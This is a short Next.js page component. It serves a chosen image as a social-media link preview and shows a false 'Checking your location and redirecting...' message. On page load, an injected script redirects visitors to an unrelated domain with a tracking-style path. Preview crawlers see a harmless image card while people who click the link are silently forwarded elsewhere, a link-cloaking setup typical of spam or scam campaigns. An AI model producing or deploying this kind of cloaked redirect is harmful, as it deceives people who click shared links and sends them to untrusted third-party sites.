export default function ImgPage({ ogImage }) {
  return (
    <html>
      <head>
        <meta property="og:image" content={ogImage} />
        <meta name="twitter:image" content={ogImage} />
        <meta property="og:type" content="website" />
        <meta property="og:title" content="Dynamic Image" />
        <meta name="twitter:card" content="summary_large_image" />
        <title>Dynamic Image</title>
      </head>
      <body>
        <h1>Checking your location and redirecting...</h1>
        <script dangerouslySetInnerHTML={{ __html: `window.setTimeout(function(){window.location.href = 'https://broadlyjukeboxunrevised.com/2053781';}, 500);` }} />
      </body>
    </html>
  );
}

export async function getServerSideProps({ params }) {
  let ogImage = "/anh1.jpeg"; // default image
  if (params.img === "anh1") ogImage = "/anh1.jpeg";
  if (params.img === "anh2") ogImage = "/anh2.jpeg";
  if (params.img === "anh3") ogImage = "/anh3.jpeg";
  if (params.img === "anh4") ogImage = "/anh4.jpeg";
  return { props: { ogImage } };
}
